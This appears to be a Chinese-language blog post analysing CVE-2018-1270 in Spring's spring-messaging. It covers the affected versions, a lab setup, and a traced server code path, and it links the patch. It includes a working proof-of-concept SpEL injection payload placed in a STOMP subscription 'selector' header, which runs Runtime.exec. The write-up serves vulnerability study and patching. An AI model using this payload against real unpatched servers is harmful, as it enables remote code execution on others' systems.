---
title: CVE-2018-1270 spring-messaging Remote Code Execution 分析
date: 2018-04-11 11:07:18
tags: [vul,sec,spring]
categories: Security
---

#### 0x01 概述
[CVE-2018-1270: Remote Code Execution with spring-messaging](https://pivotal.io/security/cve-2018-1270)

#### 0x02 影响版本
- Spring Framework 5.0 to 5.0.4
- Spring Framework 4.3 to 4.3.15
- Older unsupported versions are also affected

#### 0x03 环境搭建
```
git clone https://github.com/spring-guides/gs-messaging-stomp-websocket
git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3
```

#### 0x04 漏洞利用
在app.js中增加一个header头
```js
function connect() {
    var header  = {"selector":"T(java.lang.Runtime).getRuntime().exec('calc.exe')"};
    var socket = new SockJS('/gs-guide-websocket');
    stompClient = Stomp.over(socket);
    stompClient.connect({}, function (frame) {
        setConnected(true);
        console.log('Connected: ' + frame);
        stompClient.subscribe('/topic/greetings', function (greeting) {
            showGreeting(JSON.parse(greeting.body).content);
        }, header);
    });
}
```
spring-boot:run运行，connect建立连接后，点击发送触发漏洞

![clac](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/kVdWA)


#### 0x05 漏洞分析
在点击发送消息后，spring-message会对消息头部进行处理，相关方法在`org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java`
`addSubscriptionInternal()`

![selector](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/tvQk8)
通过`sessionId`和`subsId`确定一个`selector`属性，后续服务端就通过这个`subsId`来查找特定会话，也就是从`headers`头部信息查找`selector`，由`selector`的值作为expression被执行

点击Send后，`org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java`接收到message，message的headers头部信息包含了selector的属性，message传进`this.subscriptionRegistry.findSubscriptions`，由`findSubscriptions()`进行处理

![sendMessageToSubscribers](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/NUWfs)

跟进相关方法
`org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java`

```java
@Override
protected MultiValueMap<String, String> findSubscriptionsInternal(String destination, Message<?> message) {
	MultiValueMap<String, String> result = this.destinationCache.getSubscriptions(destination, message);
	return filterSubscriptions(result, message);
}
```
result的值作为`filterSubscriptions()`的`allMatches`参数传入，遍历出`sessionId`和`subsId`，此时的result为

![result](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1AvIp)
跟进`filterSubscriptions()`

经过两层for循环，id为`sub-0`的subscription被赋值给`sub`(P.S. 此图是后来补的，故sessionId不一样)

![for](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/wHSXE)
![sub](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/QY3Ep)
通过`sub.getSelectorExpression()`得到`expression`的值，此时的`expression`就包含着我们发送的表达式

![expression](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/zwRxS)

再往下，执行到`expression.getValue()`，SpEL得到执行，触发poc

![calc](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/vJ027)


#### 0x06 补丁
https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a

#### 0x07 参考
- https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/
- http://blog.nsfocus.net/spring-messaging-analysis/
- https://www.anquanke.com/post/id/104140




